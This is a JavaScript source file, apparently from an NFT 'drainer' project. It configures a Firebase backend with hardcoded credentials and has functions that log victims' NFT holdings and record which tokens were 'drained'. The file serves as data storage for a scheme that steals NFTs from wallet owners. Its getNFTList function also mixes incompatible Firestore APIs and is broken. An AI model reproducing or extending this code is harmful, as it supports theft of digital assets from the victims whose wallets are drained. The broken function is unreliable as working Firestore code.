import { initializeApp } from 'firebase/app';
import { getFirestore, collection, getDoc, setDoc, doc } from "firebase/firestore";

export const  firebaseConfig = {
  apiKey: "AIzaSyCUjS_80sPNZHDF0OmsS1u1t33fX5Hsh-k",
  authDomain: "drainers-e9dd2.firebaseapp.com",
  projectId: "drainers-e9dd2",
  storageBucket: "drainers-e9dd2.appspot.com",
  messagingSenderId: "348862984018",
  appId: "1:348862984018:web:3c521ac5e08acb4d0a548b",
  measurementId: "G-F7X02NQ8H0"
};

export const app = initializeApp(firebaseConfig);

export const firestore = getFirestore(app);

// Fetch NFT data
export const getNFTData = async (account) => {
    try {
      const accountRef =  doc(firestore, "account", account);
      const accountSnap = await getDoc(accountRef);
      const nftData = {};

      if (accountSnap.exists()) {
        const contractAddress = accountSnap.data().contract;
        const contractRef = doc(firestore, "account", account, "contract", contractAddress);
        const contractSnap = await getDoc(contractRef);
        let tokens = [];
        if (contractSnap.exists()) {
          tokens = contractSnap.data().nfts;
        }
        nftData[contractAddress] = tokens;
      }
      return nftData;
    } catch (error) {
      throw error;
    }
  };

// Add NFT data
export const addNFTData = async (account, nftList) => {
    try {

        const accountRef = doc(firestore, "account", account);

        for (const contractAddress in nftList) {
          await setDoc(accountRef, {contract: contractAddress});
            const nfts = nftList[contractAddress];
            const contractRef = doc(firestore, "account", account, "contract", contractAddress)
            await setDoc(contractRef, { nfts })
        }
        return { success: true, msg: 'NFT data added successfully '};
    } catch (error) {
        throw error;
    }
};

// Fetch list of all NFTs
export const getNFTList = async () => {
    try {
        const nftList = [];
        const accountCollection = await getDoc(collection(firestore, "account"));
        const accounts = await accountCollection.listDocuments()

        for (const accountDoc of accounts) {
          const nftsCollection = accountDoc.collection("nfts");
          const nftContracts = await nftsCollection.listDocuments();

          for (const contractDoc of nftContracts) {
            const tokensCollection = contractDoc.collection("tokens");
            const tokens = await tokensCollection.listDocuments();

            tokens.forEach((tokenDoc) => {
              const tokenData = tokenDoc.data();
              nftList.push({
                account: accountDoc.id,
                contract: contractDoc.id,
                tokenId: tokenDoc.id,
                tokenName: tokenData.tokenName,
                tokenType: tokenData.tokenType,
                tokenUri: tokenData.tokenUri
              });
            });
          }
        }
        return nftList;
    } catch (error) {
        throw error;
    }
};

export const getTokenIdsForContract = async (data, contractAddress) => {
      const tokenIds = [];

      if (data && data[contractAddress.toLowerCase()]) {
          const contractData = data[contractAddress.toLowerCase()];

          contractData.forEach(item => {
              if (item.tokenId) {
                  tokenIds.push(item.tokenId);
              } else if (item.tokenId === 0) {
                  tokenIds.push("0");
              }
          });
      }

      return tokenIds;
}

export const addDroppedNFTData = async (account, tokenList) => {
    try {
          const drainedRef = doc(firestore, "drained", account);
          await setDoc(drainedRef, {tokens: tokenList});

          return { success: true, msg: 'Drained NFT data added successfully'};
        } catch (error) {
          throw error;
        }
}